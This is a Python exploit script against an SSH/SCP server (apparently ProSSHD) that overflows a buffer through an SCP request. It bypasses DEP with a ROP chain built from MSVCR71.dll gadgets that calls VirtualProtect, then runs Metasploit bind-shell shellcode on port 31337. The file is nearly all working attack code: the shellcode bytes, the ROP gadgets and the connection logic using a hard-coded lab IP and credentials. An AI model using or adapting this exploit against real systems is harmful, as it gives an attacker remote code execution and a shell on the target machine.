# prosshd_dep.py
# -*- coding: utf-8 -*-
import paramiko
from scpclient import *
from contextlib import closing
from time import sleep
import struct

hostname = "192.168.10.104"
username = "test1"
password = "asdf"

# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=31337, RHOST=, EXITFUNC=process,
shellcode = (
"\xdd\xc1\xd9\x74\x24\xf4\xbb\xc4\xaa\x69\x8a\x58\x33\xc9\xb1"
"\x56\x83\xe8\xfc\x31\x58\x14\x03\x58\xd0\x48\x9c\x76\x30\x05"
"\x5f\x87\xc0\x76\xe9\x62\xf1\xa4\x8d\xe7\xa3\x78\xc5\xaa\x4f"
"\xf2\x8b\x5e\xc4\x76\x04\x50\x6d\x3c\x72\x5f\x6e\xf0\xba\x33"
"\xac\x92\x46\x4e\xe0\x74\x76\x81\xf5\x75\xbf\xfc\xf5\x24\x68"
"\x8a\xa7\xd8\x1d\xce\x7b\xd8\xf1\x44\xc3\xa2\x74\x9a\xb7\x18"
"\x76\xcb\x67\x16\x30\xf3\x0c\x70\xe1\x02\xc1\x62\xdd\x4d\x6e"
"\x50\x95\x4f\xa6\xa8\x56\x7e\x86\x67\x69\x4e\x0b\x79\xad\x69"
"\xf3\x0c\xc5\x89\x8e\x16\x1e\xf3\x54\x92\x83\x53\x1f\x04\x60"
"\x65\xcc\xd3\xe3\x69\xb9\x90\xac\x6d\x3c\x74\xc7\x8a\xb5\x7b"
"\x08\x1b\x8d\x5f\x8c\x47\x56\xc1\x95\x2d\x39\xfe\xc6\x8a\xe6"
"\x5a\x8c\x39\xf3\xdd\xcf\x55\x30\xd0\xef\xa5\x5e\x63\x83\x97"
"\xc1\xdf\x0b\x94\x8a\xf9\xcc\xdb\xa1\xbe\x43\x22\x49\xbf\x4a"
"\xe1\x1d\xef\xe4\xc0\x1d\x64\xf5\xed\xc8\x2b\xa5\x41\xa2\x8b"
"\x15\x22\x12\x64\x7c\xad\x4d\x94\x7f\x67\xf8\x92\xb1\x53\xa9"
"\x74\xb0\x63\x37\xec\x3d\x85\xad\xfe\x6b\x1d\x59\x3d\x48\x96"
"\xfe\x3e\xba\x8a\x57\xa9\xf2\xc4\x6f\xd6\x02\xc3\xdc\x7b\xaa"
"\x84\x96\x97\x6f\xb4\xa9\xbd\xc7\xbf\x92\x56\x9d\xd1\x51\xc6"
"\xa2\xfb\x01\x6b\x30\x60\xd1\xe2\x29\x3f\x86\xa3\x9c\x36\x42"
"\x5e\x86\xe0\x70\xa3\x5e\xca\x30\x78\xa3\xd5\xb9\x0d\x9f\xf1"
"\xa9\xcb\x20\xbe\x9d\x83\x76\x68\x4b\x62\x21\xda\x25\x3c\x9e"
"\xb4\xa1\xb9\xec\x06\xb7\xc5\x38\xf1\x57\x77\x95\x44\x68\xb8"
"\x71\x41\x11\xa4\xe1\xae\xc8\x6c\x11\xe5\x50\xc4\xba\xa0\x01"
"\x54\xa7\x52\xfc\x9b\xde\xd0\xf4\x63\x25\xc8\x7d\x61\x61\x4e"
"\x6e\x1b\xfa\x3b\x90\x88\xfb\x69")

# ROP chain generated by Mona.py, along with fixes to deal with alignment.
rop 	 = struct.pack('<L',0x7c349614)    # RETN, skip 4 bytes [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c34728e)    # POP EAX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0xfffffcdf)    # Value to add to EBP,
rop 	+= struct.pack('<L',0x7c1B451A)    # ADD EBP,EAX # RETN
rop 	+= struct.pack('<L',0x7c34728e)    # POP EAX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0xfffffdff)    # Value to negate to 0x00000201
rop 	+= struct.pack('<L',0x7c353c73)    # NEG EAX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c34373a)    # POP EBX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0xffffffff)    #
rop 	+= struct.pack('<L',0x7c345255)    # INC EBX #FPATAN #RETN MSVCR71.dll
rop 	+= struct.pack('<L',0x7c352174)    # ADD EBX,EAX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c344efe)    # POP EDX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0xffffffc0)    # Value to negate to0x00000040
rop 	+= struct.pack('<L',0x7c351eb1)    # NEG EDX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c36ba51)    # POP ECX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c38f2f4)    # &Writable location [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c34a490)    # POP EDI # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c346c0b)    # RETN (ROP NOP) [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c352dda)    # POP ESI # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c3415a2)    # JMP [EAX] [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c34d060)    # POP EAX # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c37a151)    # ptr to &VirtualProtect()
rop 	+= struct.pack('<L',0x7c378c81)    # PUSHAD # â€¦ # RETN [MSVCR71.dll]
rop 	+= struct.pack('<L',0x7c345c30)    # &push esp #  RET [MSVCR71.dll]

req = "\x41" * 489
nop = "\x90" * 200

ssh_client = paramiko.SSHClient()
ssh_client.load_system_host_keys()
ssh_client.connect(hostname, username=username, key_filename=None, password=password)
sleep(1)
with closing(Read(ssh_client.get_transport(),req+rop+nop+shellcode)) as scp:
    scp.receive("foo.txt")